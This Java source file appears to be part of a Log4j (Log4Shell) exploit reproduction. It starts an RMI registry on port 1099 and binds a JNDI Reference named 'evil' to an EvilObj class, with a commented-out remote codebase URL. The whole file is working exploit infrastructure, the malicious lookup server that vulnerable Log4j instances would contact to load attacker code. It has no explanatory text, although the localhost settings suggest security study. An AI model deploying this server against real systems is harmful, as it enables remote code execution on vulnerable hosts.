/*
 * Copyright (C), 2002-2021, moon-zhou
 * FileName: RmiServer.java
 * Author:   moon-zhou
 * Email:    ayimin1989@163.com
 * Date:     2021/12/12 16:23
 * Description: //模块目的、功能描述
 * History: //修改记录
 * <author>      <time>      <version>    <desc>
 * 修改人姓名    修改时间    版本号       描述
 */
package org.moonzhou.log4j.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 功能描述:<br>
 *
 * @author moon-zhou
 * @see [相关类/方法]（可选）
 * @since [产品/模块版本] （可选）
 */
public class RmiServer {

    public static void main(String[] args) {
        try {
//            System.setProperty("java.rmi.server.hostname", "192.168.43.158");

            // 注意端口
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("Create RMI registry on port 1099");

//            Reference reference = new Reference("EvilObj", "EvilObj", "http://127.0.0.1:80/");
            Reference reference = new Reference("org.moonzhou.log4j.rmi.EvilObj", "org.moonzhou.log4j.rmi.EvilObj", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);


        } catch (RemoteException | NamingException | AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
